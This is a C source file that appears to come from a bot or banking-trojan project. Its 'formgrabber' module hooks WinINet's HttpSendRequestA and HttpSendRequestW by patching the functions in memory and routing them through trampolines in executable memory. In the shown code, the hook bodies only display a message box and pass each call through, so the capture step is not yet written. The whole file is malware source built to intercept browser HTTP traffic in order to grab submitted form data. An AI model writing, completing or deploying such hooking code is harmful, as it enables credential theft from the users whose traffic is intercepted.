#include "wininet.h"
#ifdef MODULE_FORMGRABBER
#include "formgrabber.h"
#include "hook.h"
#include <WinInet.h>

ptHttpSendRequestA oHttpSendRequestA;
ptHttpSendRequestW oHttpSendRequestW;

ptHttpOpenRequestA oHttpOpenRequestA;
ptHttpOpenRequestW oHttpOpenRequestW;

extern bot_t bot;

BOOL WINAPI HttpSendRequestW_Hooked(HINTERNET hRequest,LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional,DWORD dwOptionalLength)
{
	MessageBox(0, "HttpSendRequestW", 0, 0);
	return oHttpSendRequestW(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
}

BOOL WINAPI HttpSendRequestA_Hooked( HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
{
	MessageBox(0, "HttpSendRequestA", 0, 0);
	return oHttpSendRequestA(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
}

HINTERNET WINAPI HttpOpenRequestA_Hooked(HINTERNET hConnect,LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer,LPCSTR FAR * lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)
{
	return oHttpOpenRequestA(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
}

HINTERNET WINAPI HttpOpenRequestW_Hooked(HINTERNET hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR* lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)
{
	return oHttpOpenRequestW(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
}

BOOL WINAPI IsWininet(HMODULE* phMod)
{
	HMODULE hMod;

	if ((hMod = bot.api.pGetModuleHandleW(L"wininet.dll")) != 0)
	{
		*phMod = hMod;

		return TRUE;
	}

	return FALSE;
}

BOOL WINAPI InstallWininetHooks(void)
{
	HMODULE hMod;
	unsigned int i;
	LPVOID lpFunctionAddress;
	DWORD dwLength;
	formgrabber_hook_t hooks[] =
	{
		{"HttpSendRequestA", &HttpSendRequestA_Hooked, (LPVOID*)&oHttpSendRequestA},
		{"HttpSendRequestW", &HttpSendRequestW_Hooked, (LPVOID*)&oHttpSendRequestW}
	};

	if (!IsWininet(&hMod))
		return FALSE;

	for (i = 0; i < sizeof(hooks) / sizeof(formgrabber_hook_t); i++)
	{
		if ((lpFunctionAddress = CWA(GetProcAddress)(hMod, hooks[i].pszFunctionName)) != 0)
		{
			*hooks[i].lppOriginal = bot.api.pVirtualAlloc(0, 25, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

			if (!HookFunction(lpFunctionAddress, hooks[i].lpCallback, *hooks[i].lppOriginal, &dwLength))
				return FALSE;
		}
	}

	return TRUE;
}
#endif